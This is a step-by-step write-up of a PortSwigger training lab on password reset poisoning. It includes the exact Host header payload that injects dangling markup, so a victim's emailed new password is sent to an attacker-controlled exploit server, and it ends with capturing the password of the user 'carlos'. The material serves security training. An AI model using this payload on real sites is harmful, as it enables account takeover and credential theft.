# [Password reset poisoning via dangling markup](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)

- The site emails a **new password** directly in the email body.
- The email also contains a **link** built using the **Host header**.
- We can **poison** that Host header.
- We break out of the link and add an **unfinished `<a href>` tag** (that is "dangling markup").
- That unfinished tag **swallows** the rest of the email, including the password, and **leaks it to our server**.

## Part 1: See how reset emails work

- Go to the login page.
- Request a **password reset** for your own account (`wiener`).
- Open the **exploit server** -> **email client**.
- Read the email.
- **Notice**: the link just goes to the login page. The **new password is written in the text**, not behind a token.

## Part 2: Find the weak spot

- In **Proxy history**, look at the response to `GET /email`.
- The rendered email is cleaned by **DOMPurify**. That blocks normal HTML injection.
- In the email client, switch the view to **raw HTML**.
- The **raw version is NOT cleaned**.

## Part 3: Test the Host header

- Send the `POST /forgot-password` request to **Repeater**.
- Try changing the Host domain -> you get a **server error**.
- But you **can add a port**:

```
Host: YOUR-LAB-ID.web-security-academy.net:1234
```

- The site still works, and still sends the email.
- Check the **raw** email again.
- Your port shows up **inside a link**, as a **single-quoted string**, right before the new password.

## Part 4: Inject the dangling markup

- Send `POST /forgot-password` again and make the Host header this exact shape:

```
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
```

> What this does:

- The `'` **closes** the quoted string
- The `<a href="...` starts a **new, unfinished link**
- Everything after it (including the password) gets sucked into that link
- Check the email client.
- Most of the email looks **missing** now. Good, that means it worked.
- Go to the exploit server -> **Access log**.
- Find a line starting like:

```
GET /?/login'>[...]
```

- That contains **your** new password.

## Part 5: Target carlos

- In Repeater, send the **same** request **one more time** but whit carlos:

```
username=carlos
```

- Refresh the **access log**.
- Find the new entry -> that holds **carlos's new password**.
